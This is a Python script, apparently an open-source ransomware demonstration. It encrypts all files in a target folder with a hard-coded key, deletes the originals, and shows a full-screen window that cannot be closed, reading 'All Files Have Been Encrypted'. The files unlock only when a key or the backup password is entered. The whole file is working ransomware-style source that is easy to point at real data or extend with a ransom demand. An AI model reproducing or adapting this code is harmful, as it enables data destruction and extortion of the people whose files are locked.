import os
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
import random

# --- CONFIG --- 
MAIN_KEY = b'F5uY4t5sM7Xl1t5Z3k8rF0yJvV6aQ1bR9wU2sX8nD4o='  # main encryption key
BACKUP_KEY = "cat"                                         # backup key
TARGET_FOLDER = "files_to_encrypt"
ENCRYPTED_EXTENSION = ".enc"

# --- HELPER FUNCTIONS ---
def encrypt_file(filepath, key):
    fernet = Fernet(key)
    with open(filepath, "rb") as file:
        data = file.read()
    encrypted = fernet.encrypt(data)
    with open(filepath + ENCRYPTED_EXTENSION, "wb") as file:
        file.write(encrypted)
    os.remove(filepath)

def decrypt_file(filepath, key):
    fernet = Fernet(key)
    with open(filepath, "rb") as file:
        data = file.read()
    decrypted = fernet.decrypt(data)
    original_path = filepath.replace(ENCRYPTED_EXTENSION, "")
    with open(original_path, "wb") as file:
        file.write(decrypted)
    os.remove(filepath)

def encrypt_all_files():
    if not os.path.exists(TARGET_FOLDER):
        os.makedirs(TARGET_FOLDER)
    for file in os.listdir(TARGET_FOLDER):
        full_path = os.path.join(TARGET_FOLDER, file)
        if os.path.isfile(full_path) and not file.endswith(ENCRYPTED_EXTENSION):
            encrypt_file(full_path, MAIN_KEY)

def decrypt_all_files(input_key):
    if input_key == BACKUP_KEY:
        key_to_use = MAIN_KEY
    else:
        try:
            key_to_use = input_key.encode()
        except Exception:
            messagebox.showerror("Error", "Invalid key format!")
            return False
    
    for file in os.listdir(TARGET_FOLDER):
        if file.endswith(ENCRYPTED_EXTENSION):
            full_path = os.path.join(TARGET_FOLDER, file)
            try:
                decrypt_file(full_path, key_to_use)
            except Exception:
                messagebox.showerror("Error", "Wrong key!")
                return False
    messagebox.showinfo("Success", "Files decrypted successfully!")
    return True

# --- FLOATING FILE CLASS ---
class FloatingFile:
    def __init__(self, canvas):
        self.canvas = canvas
        self.size = random.randint(20, 50)
        self.x = random.randint(0, 600)
        self.y = random.randint(0, 400)
        self.dx = random.choice([-3, -2, -1, 1, 2, 3])
        self.dy = random.choice([-3, -2, -1, 1, 2, 3])
        self.color = f'#{random.randint(0,255):02x}{random.randint(0,255):02x}{random.randint(0,255):02x}'
        self.id = self.canvas.create_rectangle(self.x, self.y,
                                               self.x + self.size, self.y + self.size,
                                               fill=self.color, outline="")

    def move(self):
        self.x += self.dx
        self.y += self.dy
        if self.x <= 0 or self.x + self.size >= 600:
            self.dx *= -1
        if self.y <= 0 or self.y + self.size >= 400:
            self.dy *= -1
        self.canvas.coords(self.id, self.x, self.y, self.x + self.size, self.y + self.size)

# --- GUI ---
class EncryptApp:
    def __init__(self, root):
        self.root = root
        root.title("Secure File Locker")
        root.attributes("-fullscreen", True)  # full screen
        root.configure(bg="black")
        root.protocol("WM_DELETE_WINDOW", self.disable_event)  # disable close button

        # Canvas for floating files
        self.canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), bg="black")
        self.canvas.pack(fill="both", expand=True)

        # Floating files
        self.files = [FloatingFile(self.canvas) for _ in range(50)]
        self.running = True
        self.animate()

        # Key entry frame
        self.entry_frame = tk.Frame(root, bg="black")
        self.entry_frame.place(relx=0.5, rely=0.85, anchor="center")
        self.key_entry = tk.Entry(self.entry_frame, show="*", font=("Arial", 20), width=30)
        self.key_entry.pack(side="left", padx=10)
        self.key_entry.focus()
        self.submit_btn = tk.Button(self.entry_frame, text="Unlock Files", font=("Arial", 16), command=self.unlock_files)
        self.submit_btn.pack(side="left")

        # Large text edit area
        self.text_frame = tk.Frame(root, bg="black")
        self.text_frame.place(relx=0.5, rely=0.3, anchor="center")
        self.text_area = tk.Text(self.text_frame, font=("Arial", 28), width=40, height=5, bg="black", fg="white")
        self.text_area.pack()
        self.text_area.insert("1.0", "All Files Have Been Encrypted. This is where i would ask you for money, but this is a open source project. ")  # placeholder text

    def disable_event(self):
        pass  # disables closing

    def animate(self):
        if not self.running:
            return
        for f in self.files:
            f.move()
        self.root.after(50, self.animate)

    def unlock_files(self):
        key = self.key_entry.get()
        if decrypt_all_files(key):
            self.running = False
            self.root.destroy()

# --- MAIN ---
if __name__ == "__main__":
    encrypt_all_files()
    root = tk.Tk()
    app = EncryptApp(root)
    root.mainloop()
